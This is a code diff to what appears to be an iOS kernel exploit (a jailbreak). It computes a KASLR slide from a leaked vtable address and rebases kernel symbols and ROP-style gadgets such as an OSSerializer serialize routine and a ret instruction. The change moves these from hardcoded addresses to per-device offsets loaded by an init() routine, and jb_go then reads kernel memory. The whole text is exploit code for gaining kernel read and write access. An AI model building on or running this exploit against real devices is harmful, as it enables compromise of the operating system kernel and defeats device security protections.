@@ -15,6 +15,8 @@
 
 #include <CoreFoundation/CoreFoundation.h>
 
+#include "init_offsets.h"
+
 // IOKit stuff
 
 #define kIOMasterPortDefault MACH_PORT_NULL
@@ -578,11 +580,11 @@ uint64_t prepare_kernel_rw() {
     // rebase the symbols
     kaslr_shift = vtable - 0xFFFFFFF006FA2C50;
 
-    kernel_base = 0xFFFFFFF007004000 + kaslr_shift;
-    get_metaclass = 0xFFFFFFF0074446DC + kaslr_shift;
-    osserializer_serialize = 0xFFFFFFF00745B0DC + kaslr_shift;
-    ret = 0xFFFFFFF0074446E4 + kaslr_shift;
-    kernel_uuid_copy = 0xFFFFFFF0074664F8 + kaslr_shift;
+    kernel_base = off1 + kaslr_shift;
+    get_metaclass = off2 + kaslr_shift;
+    osserializer_serialize = off3 + kaslr_shift;
+    ret = off4 + kaslr_shift;
+    kernel_uuid_copy = off5 + kaslr_shift;
 
     // save the port and userclient so we can use them for the r/w
     oob_port = first_port;
@@ -594,6 +596,7 @@ uint64_t prepare_kernel_rw() {
 }
 
 int jb_go() {
+    init();
     uint64_t kernel_base = prepare_kernel_rw();
     uint64_t val = rk64(kernel_base);
     printf("read from kernel memory: 0x%016llx\n", val);
